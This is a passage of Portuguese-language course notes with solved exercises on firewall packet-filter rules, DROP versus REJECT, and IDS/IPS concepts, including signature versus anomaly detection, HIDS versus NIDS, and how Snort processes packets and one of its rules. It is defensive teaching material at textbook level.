origem</th><th>Porta origem</th><th>IP destino</th><th>Porta destino</th><th>Ação</th></tr></thead><tbody><tr><td>1</td><td>Qualquer</td><td>&gt; 1023</td><td>172.16.20.5</td><td>80</td><td>Permit</td></tr><tr><td>2</td><td>Qualquer</td><td>&gt; 1023</td><td>172.16.20.5</td><td>443</td><td>Permit</td></tr><tr><td>3</td><td>10.0.0.100</td><td>&gt; 1023</td><td>172.16.20.5</td><td>22</td><td>Permit</td></tr><tr><td>4</td><td>Qualquer</td><td>Qualquer</td><td>Qualquer</td><td>Qualquer</td><td><strong>Deny</strong> (implícito)</td></tr></tbody></table></div><p>A regra implícita no final é <strong>deny all</strong>. FTP (21) e &quot;outros&quot; não precisam de regra: caem no deny final. Em um filtro sem estado as respostas também precisam de regras, com o flag ACK (slide 471): origem 172.16.20.5 porta 80, 443 ou 22 para destino qualquer, porta &gt; 1023, ACK ligado, permit. Em um filtro com estado a tabela de estado trata as respostas.</p><p><strong>4. Filtro negativo para o mesmo servidor.</strong></p><div class="table-wrapper"><table><thead><tr><th>Regra</th><th>IP origem</th><th>Porta origem</th><th>IP destino</th><th>Porta destino</th><th>Ação</th></tr></thead><tbody><tr><td>1</td><td>10.0.0.100</td><td>Qualquer</td><td>172.16.20.5</td><td>22</td><td>Permit</td></tr><tr><td>2</td><td>Qualquer</td><td>Qualquer</td><td>172.16.20.5</td><td>22</td><td>Deny</td></tr><tr><td>3</td><td>Qualquer</td><td>Qualquer</td><td>172.16.20.5</td><td>21</td><td>Deny</td></tr><tr><td>4</td><td>Qualquer</td><td>Qualquer</td><td>172.16.20.5</td><td>1 a 79</td><td>Deny</td></tr><tr><td>5</td><td>Qualquer</td><td>Qualquer</td><td>172.16.20.5</td><td>81 a 442</td><td>Deny</td></tr><tr><td>6</td><td>Qualquer</td><td>Qualquer</td><td>172.16.20.5</td><td>444 a 65535</td><td>Deny</td></tr><tr><td>7</td><td>Qualquer</td><td>Qualquer</td><td>Qualquer</td><td>Qualquer</td><td><strong>Allow</strong> (implícito)</td></tr></tbody></table></div><p>A regra implícita no final é <strong>allow all</strong>. A regra 1 precisa vir antes da regra 2, porque as regras executam de cima para baixo e o SSH do administrador é a exceção. As regras 4 a 6 existem só porque o requisito diz &quot;outros: não&quot;. Um filtro negativo não consegue expressar isso sem enumerar cada porta a bloquear (a regra 3 fica então redundante com a regra 4, mantida por clareza).</p><p><strong>5. Prós e contras das duas implementações.</strong></p><div class="table-wrapper"><table><thead><tr><th>Aspecto</th><th>Filtro positivo (descarte padrão)</th><th>Filtro negativo (encaminhamento padrão)</th></tr></thead><tbody><tr><td>Segurança</td><td>Conservador: serviço esquecido fica fechado</td><td>Reduzida: um serviço esquecido fica aberto</td></tr><tr><td>Regras</td><td>3 regras curtas, uma por serviço permitido</td><td>6 regras com faixas para &quot;outros: não&quot;</td></tr><tr><td>Novo serviço</td><td>Adicionar uma regra permit</td><td>Abrir um buraco em uma faixa, risco de erro</td></tr><tr><td>Nova ameaça</td><td>Já bloqueada</td><td>O administrador precisa reagir a cada uma</td></tr><tr><td>Usuários</td><td>Veem um obstáculo no início</td><td>Mais fácil para os usuários finais</td></tr><tr><td>Erro de configuração</td><td>Uma regra errada abre um serviço</td><td>Uma faixa errada abre muitos</td></tr><tr><td>Quem (slide 466)</td><td>Empresas e governo</td><td>Organizações abertas, universidades</td></tr></tbody></table></div><p>Para um servidor web corporativo o filtro positivo é a escolha correta: a tabela de requisitos é ela mesma uma lista branca.</p><h3 id="secao-5-drop-versus-reject" tabindex="-1"><span class="cut mono-5 wght-4 slnt-4 step-2">S</span><span class="cut mono-1 wght-5 slnt-3 step-3">e</span><span class="cut mono-2 wght-5 slnt-2 step-0">ç</span><span class="cut mono-1 wght-2 slnt-2 step-0">ã</span><span class="cut mono-2 wght-2 slnt-4 step-0">o</span> <span class="cut mono-1 wght-5 slnt-3 step-2">5</span><span class="cut mono-0 wght-0 slnt-1 step-3">:</span> <span class="cut mono-1 wght-2 slnt-0 step-3">D</span><span class="cut mono-0 wght-4 slnt-4 step-1">R</span><span class="cut mono-0 wght-0 slnt-3 step-3">O</span><span class="cut mono-0 wght-5 slnt-1 step-2">P</span> <span class="cut mono-3 wght-4 slnt-3 step-3">v</span><span class="cut mono-1 wght-5 slnt-3 step-1">e</span><span class="cut mono-0 wght-2 slnt-4 step-0">r</span><span class="cut mono-0 wght-5 slnt-1 step-3">s</span><span class="cut mono-1 wght-0 slnt-5 step-0">u</span><span class="cut mono-3 wght-5 slnt-5 step-3">s</span> <span class="cut mono-2 wght-3 slnt-4 step-0">R</span><span class="cut mono-0 wght-4 slnt-2 step-0">E</span><span class="cut mono-1 wght-0 slnt-1 step-3">J</span><span class="cut mono-5 wght-3 slnt-2 step-3">E</span><span class="cut mono-1 wght-0 slnt-0 step-3">C</span><span class="cut mono-5 wght-3 slnt-0 step-2">T</span> <a class="header-anchor" href="#secao-5-drop-versus-reject" aria-hidden="true">#</a></h3><p><strong>1. A diferença técnica entre DROP (deny, descarte) e REJECT. O que o firewall envia de volta?</strong></p><p>Nos slides, descartar é a ação do filtro de pacotes (slide 465) e o modo furtivo descarta pacotes não solicitados para que o sistema pareça ausente (slide 500). Além dos slides: <strong>DROP</strong> descarta o pacote em silêncio e <strong>nada</strong> envia de volta. <strong>REJECT</strong> descarta o pacote e envia um erro de volta ao remetente: uma mensagem de erro ICMP (destino ou porta inalcançável, ou administrativamente proibido) para UDP e outros protocolos, ou um reset TCP para TCP.</p><p><strong>2. Qual flag TCP a resposta do REJECT carrega?</strong></p><p>Além dos slides: o flag <strong>RST</strong> (reset). O firewall simula um host que recusa a conexão, que é exatamente o que um host faz quando um SYN chega a uma porta fechada.</p><p><strong>3. Por que DROP é uma técnica furtiva contra varreduras de portas? Como o silêncio afeta a conclusão e o tempo do atacante comparado ao REJECT?</strong></p><p>Com REJECT o atacante recebe uma resposta imediata para cada sondagem: um RST significa &quot;porta fechada, host vivo&quot;, então a varredura termina rápido e o atacante aprende quais hosts existem e quais portas estão filtradas versus fechadas. Com DROP nada volta. O atacante não consegue distinguir uma porta filtrada de um host que não existe, que é o modo furtivo do slide 500: o sistema parece não estar presente. O scanner do atacante precisa esperar um <strong>timeout</strong> em cada sondagem e normalmente retransmitir, então a varredura demora muito mais, e o resultado é &quot;filtrada&quot;, não &quot;fechada&quot;. O custo fica do lado do atacante, e o firewall não revela nada.</p><hr><h2 id="_5-lista-de-exercicios-9-resolvida-ids-ips" tabindex="-1"><span class="cut mono-2 wght-3 slnt-5 step-1">5</span><span class="cut mono-4 wght-5 slnt-5 step-0">.</span> <span class="cut mono-1 wght-5 slnt-0 step-0">L</span><span class="cut mono-3 wght-0 slnt-4 step-1">i</span><span class="cut mono-1 wght-5 slnt-4 step-1">s</span><span class="cut mono-1 wght-2 slnt-4 step-2">t</span><span class="cut mono-5 wght-5 slnt-0 step-1">a</span> <span class="cut mono-2 wght-5 slnt-2 step-3">d</span><span class="cut mono-2 wght-4 slnt-4 step-1">e</span> <span class="cut mono-0 wght-3 slnt-0 step-3">e</span><span class="cut mono-4 wght-5 slnt-4 step-0">x</span><span class="cut mono-4 wght-4 slnt-4 step-1">e</span><span class="cut mono-0 wght-4 slnt-5 step-2">r</span><span class="cut mono-0 wght-5 slnt-4 step-0">c</span><span class="cut mono-0 wght-5 slnt-5 step-1">í</span><span class="cut mono-0 wght-4 slnt-2 step-0">c</span><span class="cut mono-3 wght-5 slnt-4 step-3">i</span><span class="cut mono-2 wght-1 slnt-4 step-2">o</span><span class="cut mono-2 wght-3 slnt-4 step-1">s</span> <span class="cut mono-2 wght-1 slnt-5 step-0">9</span><span class="cut mono-3 wght-2 slnt-4 step-0">,</span> <span class="cut mono-5 wght-4 slnt-3 step-0">r</span><span class="cut mono-0 wght-5 slnt-2 step-2">e</span><span class="cut mono-0 wght-5 slnt-1 step-1">s</span><span class="cut mono-0 wght-4 slnt-3 step-2">o</span><span class="cut mono-2 wght-0 slnt-4 step-1">l</span><span class="cut mono-5 wght-1 slnt-0 step-3">v</span><span class="cut mono-2 wght-5 slnt-2 step-3">i</span><span class="cut mono-0 wght-5 slnt-3 step-2">d</span><span class="cut mono-0 wght-1 slnt-0 step-2">a</span> <span class="cut mono-0 wght-5 slnt-5 step-0">(</span><span class="cut mono-0 wght-3 slnt-4 step-0">I</span><span class="cut mono-5 wght-4 slnt-4 step-0">D</span><span class="cut mono-5 wght-3 slnt-4 step-3">S</span><span class="cut mono-1 wght-1 slnt-1 step-2">/</span><span class="cut mono-4 wght-0 slnt-1 step-3">I</span><span class="cut mono-3 wght-5 slnt-1 step-2">P</span><span class="cut mono-3 wght-5 slnt-4 step-1">S</span><span class="cut mono-2 wght-1 slnt-1 step-1">)</span> <a class="header-anchor" href="#_5-lista-de-exercicios-9-resolvida-ids-ips" aria-hidden="true">#</a></h2><h3 id="secao-1-deteccao-e-prevencao-de-intrusao" tabindex="-1"><span class="cut mono-4 wght-1 slnt-5 step-1">S</span><span class="cut mono-5 wght-3 slnt-1 step-0">e</span><span class="cut mono-1 wght-1 slnt-4 step-3">ç</span><span class="cut mono-5 wght-5 slnt-3 step-3">ã</span><span class="cut mono-1 wght-4 slnt-4 step-3">o</span> <span class="cut mono-0 wght-5 slnt-5 step-2">1</span><span class="cut mono-3 wght-1 slnt-4 step-1">:</span> <span class="cut mono-4 wght-4 slnt-1 step-0">d</span><span class="cut mono-2 wght-1 slnt-1 step-0">e</span><span class="cut mono-0 wght-0 slnt-2 step-1">t</span><span class="cut mono-4 wght-5 slnt-3 step-2">e</span><span class="cut mono-2 wght-4 slnt-0 step-3">c</span><span class="cut mono-2 wght-1 slnt-3 step-0">ç</span><span class="cut mono-4 wght-0 slnt-2 step-1">ã</span><span class="cut mono-1 wght-2 slnt-5 step-1">o</span> <span class="cut mono-3 wght-4 slnt-0 step-0">e</span> <span class="cut mono-5 wght-3 slnt-4 step-0">p</span><span class="cut mono-3 wght-0 slnt-5 step-1">r</span><span class="cut mono-4 wght-1 slnt-0 step-1">e</span><span class="cut mono-0 wght-3 slnt-5 step-1">v</span><span class="cut mono-5 wght-4 slnt-2 step-3">e</span><span class="cut mono-1 wght-2 slnt-2 step-0">n</span><span class="cut mono-4 wght-0 slnt-4 step-1">ç</span><span class="cut mono-5 wght-2 slnt-3 step-3">ã</span><span class="cut mono-4 wght-1 slnt-3 step-0">o</span> <span class="cut mono-5 wght-4 slnt-3 step-3">d</span><span class="cut mono-2 wght-0 slnt-0 step-1">e</span> <span class="cut mono-1 wght-5 slnt-4 step-3">i</span><span class="cut mono-5 wght-3 slnt-5 step-3">n</span><span class="cut mono-2 wght-4 slnt-3 step-0">t</span><span class="cut mono-3 wght-0 slnt-4 step-0">r</span><span class="cut mono-5 wght-0 slnt-2 step-0">u</span><span class="cut mono-1 wght-5 slnt-3 step-2">s</span><span class="cut mono-3 wght-2 slnt-2 step-3">ã</span><span class="cut mono-1 wght-3 slnt-5 step-3">o</span> <a class="header-anchor" href="#secao-1-deteccao-e-prevencao-de-intrusao" aria-hidden="true">#</a></h3><p><strong>1. Defina uma intrusão.</strong> Uma intrusão de segurança é um ato não autorizado de contornar os mecanismos de segurança de um sistema (slide 522). Exemplos da NIST SP 800-61 (slides 513 e 514): comprometimento remoto de root de um servidor de correio, pichação web, quebra de senhas, cópia de um banco de dados de cartões, captura de senhas com sniffer, engenharia social.</p><p><strong>2. Defina um IDS.</strong></p><p>Um sistema de detecção de intrusão: uma função de hardware ou software que coleta e analisa informação de várias áreas de um computador ou rede para identificar possíveis intrusões (slide 522). Três componentes lógicos: sensores (coletam), analisadores (decidem), interface de usuário (slide 523). Classificado como HIDS, NIDS ou distribuído (slide 524).</p><p><strong>3. Defina um IPS.</strong></p><p>Um sistema de prevenção de intrusão: um IDS colocado em linha, de modo que o tráfego precisa passar por ele, e que <strong>bloqueia</strong> um ataque ao detectá-lo (slide 552). Combina detecção com uma resposta automática.</p><p><strong>4. A diferença fundamental entre eles em termos de ação.</strong></p><p>O IDS <strong>detecta e alerta</strong>: registra o evento suspeito e notifica o administrador, que responde (slide 543: detectar, registrar, alertar). Pode rodar em um sensor passivo que vê uma cópia do tráfego. O IPS <strong>previne</strong>: ele mesmo descarta ou bloqueia o tráfego, o que exige um sensor em linha. O preço do IPS é que um falso positivo bloqueia tráfego legítimo, e a posição em linha acrescenta atraso (slide 552).</p><p><strong>5. Por que um firewall de filtro de pacotes pode ser insuficiente para detecção de intrusão.</strong></p><p>O filtro de pacotes vê só cabeçalhos L3 e L4 (slide 465). Não consegue examinar a carga útil, então não detecta ataques que usam vulnerabilidades de aplicação (slide 474), seus logs guardam só endereços e tipo de tráfego (slide 474), não mantém contexto entre pacotes (slide 478), e é contornado por falsificação e fragmentos minúsculos (slides 476 e 477). Um ataque que chega em uma porta permitida, como um exploit dentro de uma requisição HTTP, passa por ele. A detecção de intrusão precisa da carga útil (assinaturas como a opção <code>content</code> do Snort), da sequência de pacotes (o padrão de uma varredura), e de dados do host (chamadas de sistema, integridade de arquivos), que só um IDS coleta. Além disso, o firewall nunca vê tráfego que o contorna nem atividade de internos (slide 461).</p><h3 id="secao-2-detectar-uma-intrusao" tabindex="-1"><span class="cut mono-3 wght-3 slnt-5 step-1">S</span><span class="cut mono-4 wght-5 slnt-1 step-2">e</span><span class="cut mono-3 wght-4 slnt-2 step-1">ç</span><span class="cut mono-2 wght-5 slnt-1 step-3">ã</span><span class="cut mono-0 wght-3 slnt-2 step-0">o</span> <span class="cut mono-0 wght-4 slnt-2 step-2">2</span><span class="cut mono-0 wght-2 slnt-2 step-0">:</span> <span class="cut mono-3 wght-2 slnt-5 step-2">d</span><span class="cut mono-5 wght-4 slnt-5 step-2">e</span><span class="cut mono-5 wght-0 slnt-4 step-0">t</span><span class="cut mono-0 wght-5 slnt-3 step-0">e</span><span class="cut mono-5 wght-2 slnt-4 step-3">c</span><span class="cut mono-4 wght-1 slnt-5 step-2">t</span><span class="cut mono-1 wght-3 slnt-0 step-3">a</span><span class="cut mono-4 wght-3 slnt-1 step-3">r</span> <span class="cut mono-2 wght-4 slnt-0 step-0">u</span><span class="cut mono-0 wght-0 slnt-1 step-3">m</span><span class="cut mono-1 wght-5 slnt-5 step-2">a</span> <span class="cut mono-4 wght-3 slnt-0 step-2">i</span><span class="cut mono-3 wght-0 slnt-3 step-3">n</span><span class="cut mono-4 wght-0 slnt-0 step-3">t</span><span class="cut mono-2 wght-2 slnt-1 step-2">r</span><span class="cut mono-3 wght-4 slnt-0 step-2">u</span><span class="cut mono-0 wght-0 slnt-3 step-2">s</span><span class="cut mono-5 wght-5 slnt-1 step-1">ã</span><span class="cut mono-3 wght-3 slnt-3 step-2">o</span> <a class="header-anchor" href="#secao-2-detectar-uma-intrusao" aria-hidden="true">#</a></h3><p><strong>1. Defina e contraste detecção por assinatura e detecção de anomalia.</strong></p><ul><li><strong>Detecção por assinatura (ou heurística), detecção de mau uso:</strong> um conjunto de padrões maliciosos conhecidos ou regras de ataque; o comportamento observado é comparado com eles, e uma correspondência significa um intruso (slide 540). Descreve o que é <strong>ruim</strong>.</li><li><strong>Detecção de anomalia:</strong> dados sobre o comportamento legítimo ao longo do tempo constroem uma linha de base do normal; o comportamento observado é comparado com o modelo e classificado como legítimo ou anômalo (slides 533 e 534). Descreve o que é <strong>normal</strong>. Tem uma fase de treinamento e uma fase de detecção, e três categorias de classificação: estatística, baseada em conhecimento, aprendizado de máquina (slide 535).</li></ul><p><strong>2. Qual abordagem é mais eficaz para cada tipo de comportamento, e por quê?</strong></p><p>Para comportamento <strong>conhecido, catalogado</strong>: detecção por assinatura. É barata em execução, amplamente aceita, e precisa quando a assinatura tem detalhe suficiente (slide 541). Para comportamento <strong>desconhecido</strong>: detecção de anomalia. Um ataque novo não corresponde a nenhuma assinatura, então só um desvio da linha de base o revela (slides 541 e 548). O custo é uma taxa de falsos alarmes mais alta, porque o comportamento legítimo e o de ataque se sobrepõem (slides 526 e 527).</p><p><strong>3. Assinatura versus anomalia em quatro critérios.</strong></p><ul><li><strong>Ataques de dia zero:</strong> a detecção por assinatura não os detecta, não existe assinatura (slides 541 e 548). A detecção de anomalia pode, se o ataque desvia da linha de base.</li><li><strong>Taxa de falsos positivos:</strong> a detecção por assinatura é mais baixa, uma assinatura detalhada raramente corresponde a tráfego legítimo. A detecção de anomalia é mais alta: a sobreposição entre comportamento normal e de ataque (slide 527), a falácia da taxa-base (slide 529), e a taxa do aprendizado de máquina atualmente inaceitavelmente alta (slide 538).</li><li><strong>Custo computacional e de manutenção:</strong> a detecção por assinatura tem custo de execução relativamente baixo (slide 541), mas exige esforço significativo para identificar comportamento novo e escrever assinaturas. A detecção de anomalia depende da categoria: estatística é simples e barata (slide 536), baseada em conhecimento exige especialistas humanos e tempo para regras de alta qualidade (slide 537), aprendizado de máquina exige muito tempo e recursos para treinar, depois classifica com eficiência (slide 538).</li><li><strong>Adaptabilidade a novas ameaças:</strong> a detecção por assinatura precisa de uma nova assinatura para cada novo ataque. A detecção de anomalia se adapta, pois o modelo pode evoluir continuamente (slide 534), e o aprendizado de máquina é flexível e adaptável (slide 538). O requisito 6 de um IDS é adaptar-se a mudanças de comportamento ao longo do tempo (slide 531).</li></ul><h3 id="secao-3-nids-e-hids" tabindex="-1"><span class="cut mono-1 wght-0 slnt-0 step-1">S</span><span class="cut mono-5 wght-0 slnt-0 step-0">e</span><span class="cut mono-5 wght-0 slnt-5 step-0">ç</span><span class="cut mono-3 wght-2 slnt-2 step-3">ã</span><span class="cut mono-5 wght-2 slnt-5 step-1">o</span> <span class="cut mono-5 wght-2 slnt-4 step-3">3</span><span class="cut mono-4 wght-4 slnt-3 step-1">:</span> <span class="cut mono-1 wght-4 slnt-0 step-1">N</span><span class="cut mono-1 wght-1 slnt-5 step-2">I</span><span class="cut mono-4 wght-1 slnt-2 step-2">D</span><span class="cut mono-1 wght-5 slnt-5 step-0">S</span> <span class="cut mono-5 wght-2 slnt-3 step-0">e</span> <span class="cut mono-0 wght-1 slnt-0 step-1">H</span><span class="cut mono-0 wght-4 slnt-4 step-1">I</span><span class="cut mono-3 wght-4 slnt-2 step-0">D</span><span class="cut mono-3 wght-4 slnt-4 step-1">S</span> <a class="header-anchor" href="#secao-3-nids-e-hids" aria-hidden="true">#</a></h3><p><strong>1. Defina e contraste HIDS e NIDS.</strong></p><ul><li><strong>HIDS:</strong> uma camada especializada de software de segurança em um host vulnerável ou sensível (servidores de banco de dados, sistemas administrativos). Monitora a atividade dentro do sistema: rastros de chamadas de sistema, registros de auditoria, somas de verificação de integridade de arquivos, acesso ao Registro (slides 543 a 545). Propósitos: detectar, registrar, alertar. Usa as duas abordagens de análise.</li><li><strong>NIDS:</strong> monitora o tráfego em pontos selecionados da rede, pacote a pacote, em tempo real, em L3, L4 e L7. Parte do perímetro, focado em tentativas externas. Arquitetura: sensores, servidores de gerência, consoles (slide 550).</li><li><strong>Contraste (slide 550):</strong> o NIDS examina o tráfego de pacotes dirigido aos sistemas; o HIDS examina a atividade de usuários e software dentro de um host. O NIDS cobre muitos hosts com um sensor mas perde a carga útil cifrada (slide 552); o HIDS vê dados decifrados e eventos locais mas cobre um host e consome seus recursos.</li></ul><p><strong>2. Qual abordagem para cada cenário, e por quê.</strong></p><ul><li><strong>Malware fazendo chamadas de sistema anômalas: HIDS.</strong> Rastros de chamadas de sistema são a fonte preferida do HIDS (slide 544), e o STIDE compara as sequências de chamadas observadas com as normais (slide 547). A rede nunca vê uma chamada de sistema.</li><li><strong>Varredura de portas na rede corporativa: NIDS.</strong> Uma varredura é um padrão de pacotes para muitas portas ou hosts. O NIDS vê o tráfego de um segmento inteiro (slide 550), e um honeypot externo rastreia varreduras de endereços não usados também (slide 558).</li><li><strong>Tentativas de exploit em um servidor web: NIDS.</strong> As tentativas chegam como requisições HTTP pela rede e correspondem a assinaturas (regras do Snort, slide 542). Se o servidor usa HTTPS, o NIDS fica cego (slide 552) e um HIDS no servidor é necessário.</li><li><strong>Acesso não autorizado a arquivos sensíveis: HIDS.</strong> Somas de verificação de integridade de arquivos e registros de auditoria são fontes de host (slides 544 e 545), e honeyfiles geram alerta no acesso (slide 560). O NIDS vê uma transferência de arquivo só se ela cruza a rede em claro.</li></ul><p><strong>3. O uso combinado de NIDS e HIDS pode melhorar a detecção nesses cenários? Justifique.</strong></p><p>Sim. Um IDS distribuído ou híbrido combina os sensores em um analisador central e identifica e responde a intrusões melhor (slide 524), e um HIDS distribuído cooperando pela rede é a defesa mais eficaz (slide 549).</p><ul><li><strong>Chamadas de sistema anômalas:</strong> o HIDS detecta o malware; o NIDS acrescenta como ele chegou (um download, um link de spear-phishing) e se ele fala com um servidor de comando, o que também revela outros hosts infectados.</li><li><strong>Varredura de portas:</strong> o NIDS detecta a varredura; um HIDS nos hosts varridos confirma se alguma sondagem virou um login ou uma queda de serviço. Ganho pequeno, o NIDS sozinho é adequado.</li><li><strong>Exploits no servidor web:</strong> o maior ganho. O NIDS vê a requisição no fio, o HIDS vê o efeito no servidor (novos processos, chamadas de sistema, arquivos modificados), e cobre o caso HTTPS em que o NIDS fica cego.</li><li><strong>Acesso a arquivos sensíveis:</strong> o HIDS detecta o acesso; o NIDS detecta a exfiltração de um grande número de documentos para um repositório externo (slide 520), que é movimentação lateral ou roubo de dados visível só na rede.</li></ul><p><strong>4. A operação passo a passo do Snort como NIDS, da captura do pacote ao alerta.</strong></p><p>Pela figura do slide 551:</p><ol><li>O <strong>tráfego de rede</strong> chega ao sensor, por uma derivação ou uma posição em linha (slides 552 e 553).</li><li>O <strong>decodificador de pacotes</strong> analisa os cabeçalhos de protocolo (Ethernet, IP, TCP) em uma estrutura.</li><li>O <strong>pré-processador</strong> normaliza e remonta: fluxos, fragmentos, decodificação específica de protocolo, para que as regras vejam a carga útil real.</li><li>O <strong>motor de detecção</strong> compara o pacote com as <strong>regras</strong>: correspondência de cabeçalho (ação, protocolo, endereços, portas, sentido), depois as opções (<code>flow</code>, <code>content</code>, <code>depth</code>, <code>threshold</code>).</li><li>Em caso de correspondência, o <strong>sistema de registro e alerta</strong> gera o evento com o <code>msg</code>, <code>classtype</code> e <code>sid</code> da regra.</li><li>Os <strong>módulos de saída</strong> o escrevem no destino configurado: arquivo de alertas, log, banco de dados, ou console.</li></ol><p><strong>5. Uma limitação significativa do NIDS com tráfego cifrado, e uma estratégia complementar.</strong></p><p>Com TLS/SSL o NIDS perde acesso à carga útil: não consegue ver comandos maliciosos dentro de uma sessão HTTPS, então as assinaturas de conteúdo não correspondem (slide 552). Estratégias: usar um <strong>HIDS</strong> nos pontos finais, que vê os dados depois da decifragem (chamadas de sistema, arquivos, logs), como parte de um IDS distribuído (slides 524 e 549); terminar a cifragem em um <strong>proxy de aplicação</strong> ou no firewall, onde o IPsec deve ficar para que o firewall veja texto claro (slides 482 e 506), e colocar o sensor NIDS depois desse ponto; e ainda usar o NIDS no que permanece visível, os cabeçalhos e os padrões de tráfego (varreduras, taxas de conexão, fluxos). A conclusão do slide: o NIDS é só parte da solução, defesa em profundidade.</p><h3 id="secao-4-a-regra-do-snort" tabindex="-1"><span class="cut mono-2 wght-4 slnt-3 step-1">S</span><span class="cut mono-0 wght-0 slnt-1 step-3">e</span><span class="cut mono-4 wght-4 slnt-0 step-1">ç</span><span class="cut mono-1 wght-4 slnt-4 step-2">ã</span><span class="cut mono-3 wght-3 slnt-0 step-3">o</span> <span class="cut mono-2 wght-4 slnt-5 step-2">4</span><span class="cut mono-0 wght-0 slnt-3 step-2">:</span> <span class="cut mono-0 wght-2 slnt-1 step-1">a</span> <span class="cut mono-2 wght-3 slnt-5 step-2">r</span><span class="cut mono-5 wght-0 slnt-3 step-0">e</span><span class="cut mono-2 wght-3 slnt-0 step-1">g</span><span class="cut mono-3 wght-4 slnt-2 step-2">r</span><span class="cut mono-5 wght-2 slnt-3 step-3">a</span> <span class="cut mono-5 wght-2 slnt-5 step-1">d</span><span class="cut mono-2 wght-1 slnt-1 step-1">o</span> <span class="cut mono-2 wght-5 slnt-0 step-2">S</span><span class="cut mono-5 wght-0 slnt-2 step-0">n</span><span class="cut mono-5 wght-0 slnt-5 step-3">o</span><span class="cut mono-2 wght-0 slnt-4 step-2">r</span><span class="cut mono-2 wght-1 slnt-4 step-2">t</span> <a class="header-anchor" href="#secao-4-a-regra-do-snort" aria-hidden="true">#</a></h3><p><strong>1. O que cada parte do cabeçalho especifica.</strong></p><ul><li><strong>Ação:</strong> <code>alert</code>, gerar um alerta quando a condição é atendida.</li><li><strong>Protocolo e sentido:</strong> <code>tcp</code>, só TCP; <code>-&gt;</code>, da origem à esquerda para o destino à direita.</li><li><strong>Endereços de origem e destino:</strong> <code>$HOME_NET</code>, a rede interna, para <code>$EXTERNAL_NET</code>, a rede externa.</li><li><strong>Portas:</strong> origem <code>any</code>; destino <code>![7680,1521]</code>, qualquer porta exceto 7680 e 1521.</li></ul><p><strong>2. A função de cada opção.</strong></p><ul><li><code>flow:established,to_server</code>: considera só conexões TCP já estabelecidas, no sentido do servidor (slide 563). Ignora o handshake e as respostas do servidor.</li><li><code>content:&quot;|00 00 00 0d 06 00|&quot;; depth:6</code>: busca a sequência de bytes 00 00 00 0d 06 00 (as barras verticais marcam bytes hexadecimais), e só dentro dos primeiros 6 bytes da carga útil. O padrão precisa estar bem no início dos dados.</li><li><code>threshold: type limit, track by_dst, seconds 300, count 1</code>: evita alertas múltiplos, um alerta por endereço de destino a cada 300 segundos (slide 564).</li></ul><p><strong>3. Qual abordagem de detecção essa regra representa? Justifique.</strong></p><p><strong>Detecção por assinatura.</strong> A regra descreve um padrão conhecido de dados maliciosos ou indesejados: uma sequência fixa de bytes em uma posição fixa da carga útil, em um estado de protocolo conhecido, que é a mensagem de sincronização de peer do BitTorrent documentada na página de protocolo referenciada. O comportamento é comparado com o padrão e uma correspondência gera o alerta (slides 540 e 541). Nada na regra modela comportamento normal ou uma linha de base, e não há fase de treinamento, então não é detecção de anomalia. O Snort é o exemplo do slide de NIDS baseado em regras (slide 542). Seus limites são os limites das assinaturas: um cliente que muda os bytes do handshake, ou roda na porta 7680, não é detectado, e um protocolo novo precisa de uma regra nova.</p><hr><h2 id="_6-numeros-e-armadilhas" tabindex="-1"><span class="cut mono-2 wght-2 slnt-5 step-3">6</span><span class="cut mono-2 wght-3 slnt-3 step-0">.</span> <span class="cut mono-5 wght-3 slnt-0 step-0">N</span><span class="cut mono-3 wght-0 slnt-2 step-1">ú</span><span class="cut mono-2 wght-3 slnt-3 step-0">m</span><span class="cut mono-1 wght-3 slnt-0 step-2">e</span><span class="cut mono-4 wght-0 slnt-1 step-1">r</span><span class="cut mono-1 wght-5 slnt-1 step-0">o</span><span class="cut mono-3 wght-0 slnt-0 step-3">s</span> <span class="cut mono-4 wght-5 slnt-4 step-0">e</span> <span class="cut mono-4 wght-1 slnt-1 step-1">a</span><span class="cut mono-5 wght-0 slnt-4 step-1">r</span><span class="cut mono-0 wght-0 slnt-3 step-1">m</span><span class="cut mono-1 wght-3 slnt-5 step-3">a</span><span class="cut mono-2 wght-3 slnt-0 step-0">d</span><span class="cut mono-2 wght-4 slnt-2 step-3">i</span><span class="cut mono-3 wght-3 slnt-4 step-1">l</span><span class="cut mono-3 wght-3 slnt-5 step-2">h</span><span class="cut mono-1 wght-5 slnt-5 step-3">a</span><span class="cut mono-2 wght-1 slnt-0 step-1">s</span> <a class="header-anchor" href="#_6-numeros-e-armadilhas" aria-hidden="true">#</a></h2><h3 id="numeros-para-memorizar" tabindex="-1"><span class="cut mono-0 wght-1 slnt-2 step-2">N</span><span class="cut mono-5 wght-0 slnt-0 step-1">ú</span><span class="cut mono-2 wght-0 slnt-1 step-3">m</span><span class="cut mono-2 wght-1 slnt-5 step-2">e</span><span class="cut mono-4 wght-2 slnt-3 step-1">r</span><span class="cut mono-0 wght-3 slnt-3 step-2">o</span><span class="cut mono-0 wght-3 slnt-3 step-1">s</span> <span class="cut mono-0 wght-0 slnt-3 step-1">p</span><span class="cut mono-3 wght-1 slnt-3 step-3">a</span><span class="cut mono-4 wght-4 slnt-5 step-2">r</span><span class="cut mono-0 wght-0 slnt-1 step-2">a</span> <span class="cut mono-5 wght-2 slnt-3 step-2">m</span><span class="cut mono-0 wght-5 slnt-2 step-0">e</span><span class="cut mono-3 wght-4 slnt-3 step-2">m</span><span class="cut mono-5 wght-0 slnt-3 step-1">o</span><span class="cut mono-3 wght-5 slnt-3 step-2">r</span><span class="cut mono-3 wght-4 slnt-3 step-3">i</span><span class="cut mono-2 wght-1 slnt-0 step-0">z</span><span class="cut mono-5 wght-0 slnt-2 step-1">a</span><span class="cut mono-2 wght-1 slnt-0 step-1">r</span> <a class="header-anchor" href="#numeros-para-memorizar" aria-hidden="true">#</a></h3><div class="table-wrapper"><table><thead><tr><th>Item</th><th>Valor</th></tr></thead><tbody><tr><td>Estágios da evolução dos sistemas</td><td>6: mainframe, LAN, instalações, WAN corporativa, Internet, nuvem</td></tr><tr><td>Objetivos de projeto do firewall [BELL94]</td><td>3: todo tráfego passa, só o autorizado passa, imune a si mesmo</td></tr><tr><td>Características de política, NIST 800-41</td><td>4: endereço e protocolo, aplicação, identidade, atividade</td></tr><tr><td>Capacidades / limitações do firewall</td><td>4 / 4</td></tr><tr><td>Campos de regra do filtro de pacotes</td><td>5: IP origem, IP destino, portas, protocolo IP, interface</td></tr><tr><td>Vantagens / fraquezas do filtro de pacotes</td><td>3 / 5 (NIST SP 800-41)</td></tr><tr><td>Regras SMTP da Tabela 9.1</td><td>5 regras; porta 25; respostas &gt; 1023; regra 5 deny</td></tr><tr><td>Exploração do SMTP</td><td>porta 5150 do atacante para o proxy interno na porta 8080</td></tr><tr><td>Porta bem conhecida / porta do cliente</td><td>&lt; 